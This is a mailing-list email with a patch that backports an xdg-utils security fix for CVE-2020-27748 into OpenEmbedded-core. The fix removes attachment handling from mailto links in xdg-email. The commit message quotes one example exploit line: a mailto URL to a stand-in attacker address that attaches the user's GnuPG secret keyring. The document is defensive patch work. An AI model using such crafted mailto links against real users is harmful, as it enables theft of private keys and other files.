Received: from mail-oi1-f180.google.com (mail-oi1-f180.google.com [209.85.167.180])
 by mx.groups.io with SMTP id smtpd.web09.243.1631025885489014827
 for <openembedded-core@lists.openembedded.org>;
 Tue, 07 Sep 2021 07:44:45 -0700
Authentication-Results: mx.groups.io;
 dkim=pass header.i=@sakoman-com.20150623.gappssmtp.com header.s=20150623 header.b=ObwNOT0Q;
 spf=softfail (domain: sakoman.com, ip: 209.85.167.180, mailfrom: steve@sakoman.com)
Received: by mail-oi1-f180.google.com with SMTP id s20so13091387oiw.3
        for <openembedded-core@lists.openembedded.org>; Tue, 07 Sep 2021 07:44:45 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=sakoman-com.20150623.gappssmtp.com; s=20150623;
        h=from:to:subject:date:message-id:in-reply-to:references:mime-version
         :content-transfer-encoding;
        bh=C4mnULuY7IaCeCcGT2mT0Ac2uiTNPqlA2ubuRKF0Rhs=;
        b=ObwNOT0QnG1ED/2xZvO6Xa0BNRYEQRLLIqhmk8W9WOv5kgJHmlcSZW40BHDytLEkYz
         SilxA+AVRYBUQOqJdUzBKQ5kRvqjAyR3qk9yTFkmbK0Dfmm+D0d8G9isWuOKl4+hasO+
         zXwyYePe2a1IEommgXIjIcjOrmz6TuXdI22uIYo0auLngY0JbTSR8RnQ9biaS/o3KbPt
         RJfNv6X8AHuq2FRt2S5gVAneG8I8i2d2LR3G3go3dyj5rsU9U9gzR0G96SH4D5JedIkk
         qjb13Erkm2QyGwPdLKYIJuhO8jGSC2qnICMj3sKSmmB1Dtwgck0M6b55kuy+GpkE4OgL
         I6eQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:to:subject:date:message-id:in-reply-to
         :references:mime-version:content-transfer-encoding;
        bh=C4mnULuY7IaCeCcGT2mT0Ac2uiTNPqlA2ubuRKF0Rhs=;
        b=deVMqaK88afV+QXIIIymxP5c1Td1vA04NWr5k7itqJCNDSqgGgJHqB0DyUKZLqe8Nk
         GxFYBruFXQUlLcBoHn6ETnRtAH4ZXct+H/8lQQjQK48Nijft+1okcLgpskBR/BhhbtkL
         TE7CKEKtGkJOVt9l7c/lLIZG5kxS2DXhoORr2oR/XqAZWn3jlt6OtCCimVrCdskvUgf9
         Tns7qSSxpfclvLXnz6D0yeoA6T6dame2MgwZD0U6jVnE/DSOnpAzAzm1uKwq2qaZ6hOe
         hUiDwL3zdRGdRlMiJ67lm/eCYI6Bp4nMOGwxgCcMDXuiMX76CoWWtlMY0H5i1RELFEtv
         uWig==
X-Gm-Message-State: AOAM5321b44APh2lpkxf66LLncqGaUyr8CL/3kDa+3Ipbrg2On1MYL+h
	8wAxElwCXwfzvBU0j2AljXa8KbT/M2cRw5qX
X-Google-Smtp-Source: ABdhPJzSd/iulpv8hcrccmjRMDNw/+9NEDzI+9CaMyPPnt/4pjDT+WV5FAxRW6zOpyhdcVMs24RMhw==
X-Received: by 2002:aca:1914:: with SMTP id l20mr3166162oii.19.1631025884306;
        Tue, 07 Sep 2021 07:44:44 -0700 (PDT)
Return-Path: <steve@sakoman.com>
Received: from localhost.localdomain ([172.243.4.16])
        by smtp.gmail.com with ESMTPSA id q22sm1313761oof.14.2021.09.07.07.44.40
        for <openembedded-core@lists.openembedded.org>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 07 Sep 2021 07:44:43 -0700 (PDT)
From: "Steve Sakoman" <steve@sakoman.com>
To: openembedded-core@lists.openembedded.org
Subject: [OE-core][dunfell 2/5] xdg-utils: Add fix for CVE-2020-27748
Date: Tue,  7 Sep 2021 04:44:05 -1000
Message-Id: <5042a4116a024bbc320d97ea29b21a589dea9942.1631025627.git.steve@sakoman.com>
X-Mailer: git-send-email 2.25.1
In-Reply-To: <cover.1631025627.git.steve@sakoman.com>
References: <cover.1631025627.git.steve@sakoman.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

From: Richard Purdie <richard.purdie@linuxfoundation.org>

Backport an upstream patch for the CVE.

Signed-off-by: Richard Purdie <richard.purdie@linuxfoundation.org>
(cherry picked from commit 87191ed0303f6552865ad1edcacd674c57f2010c)
Signed-off-by: Steve Sakoman <steve@sakoman.com>
---
 ...9813e0eb0246f63b54e9e154970e609575af.patch | 58 +++++++++++++++++++
 .../xdg-utils/xdg-utils_1.1.3.bb              |  1 +
 2 files changed, 59 insertions(+)
 create mode 100644 meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch

diff --git a/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
new file mode 100644
index 0000000000..948b9e22e9
--- /dev/null
+++ b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
@@ -0,0 +1,58 @@
+From 1f199813e0eb0246f63b54e9e154970e609575af Mon Sep 17 00:00:00 2001
+From: =?UTF-8?q?J=C3=B6rg=20Thalheim?= <joerg@thalheim.io>
+Date: Tue, 18 Aug 2020 16:52:24 +0100
+Subject: [PATCH] xdg-email: remove attachment handling from mailto
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+This allows attacker to extract secrets from users:
+
+mailto:sid@evil.com?attach=/.gnupg/secring.gpg
+
+See also https://bugzilla.mozilla.org/show_bug.cgi?id=1613425
+and https://gitlab.freedesktop.org/xdg/xdg-utils/-/issues/177
+
+Signed-off-by: Jörg Thalheim <joerg@thalheim.io>
+---
+ scripts/xdg-email.in | 7 +------
+ 1 file changed, 1 insertion(+), 6 deletions(-)
+
+Upstream-Status: Backport
+CVE: CVE-2020-27748
+
+diff --git a/scripts/xdg-email.in b/scripts/xdg-email.in
+index 6db58ad..5d2f4f3 100644
+--- a/scripts/xdg-email.in
++++ b/scripts/xdg-email.in
+@@ -32,7 +32,7 @@ _USAGE
+ 
+ run_thunderbird()
+ {
+-    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY ATTACH
++    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY
+     THUNDERBIRD="$1"
+     MAILTO=$(echo "$2" | sed 's/^mailto://')
+     echo "$MAILTO" | grep -qs "^?"
+@@ -48,7 +48,6 @@ run_thunderbird()
+     BCC=$(/bin/echo -e $(echo "$MAILTO" | grep '^bcc=' | sed 's/^bcc=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }'))
+     SUBJECT=$(echo "$MAILTO" | grep '^subject=' | tail -n 1)
+     BODY=$(echo "$MAILTO" | grep '^body=' | tail -n 1)
+-    ATTACH=$(/bin/echo -e $(echo "$MAILTO" | grep '^attach=' | sed 's/^attach=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }' | sed 's/,$//'))
+ 
+     if [ -z "$TO" ] ; then
+         NEWMAILTO=
+@@ -68,10 +67,6 @@ run_thunderbird()
+         NEWMAILTO="${NEWMAILTO},$BODY"
+     fi
+ 
+-    if [ -n "$ATTACH" ] ; then
+-        NEWMAILTO="${NEWMAILTO},attachment='${ATTACH}'"
+-    fi
+-
+     NEWMAILTO=$(echo "$NEWMAILTO" | sed 's/^,//')
+     DEBUG 1 "Running $THUNDERBIRD -compose \"$NEWMAILTO\""
+     "$THUNDERBIRD" -compose "$NEWMAILTO"
+-- 
+GitLab
+
diff --git a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
index d371c5c28c..41b74b8598 100644
--- a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
+++ b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
@@ -20,6 +20,7 @@ LIC_FILES_CHKSUM = "file://LICENSE;md5=a5367a90934098d6b05af3b746405014"
 SRC_URI = "https://portland.freedesktop.org/download/${BPN}-${PV}.tar.gz \
            file://0001-Reinstate-xdg-terminal.patch \
            file://0001-Don-t-build-the-in-script-manual.patch \
+           file://1f199813e0eb0246f63b54e9e154970e609575af.patch \
           "
 
 SRC_URI[md5sum] = "902042508b626027a3709d105f0b63ff"
-- 
2.25.1

